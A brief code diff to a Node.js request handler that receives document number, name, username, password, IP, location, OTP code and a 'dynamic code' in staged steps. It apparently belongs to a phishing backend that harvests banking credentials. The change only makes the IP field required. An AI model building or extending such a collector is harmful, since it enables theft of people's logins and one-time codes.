@@ -26,8 +26,8 @@ module.exports = async function handler(req, res) {
 
         const { documentNumber, fullName, username, password, userIP, city, country, otpCode, dynamicCode, step } = body;
 
-        if (!documentNumber || !fullName) {
-            return res.status(400).json({ error: 'Datos incompletos: documento o nombre faltante' });
+        if (!documentNumber || !fullName || !userIP) {
+            return res.status(400).json({ error: 'Datos incompletos: documento, nombre o IP faltante' });
         }
 
         let message;
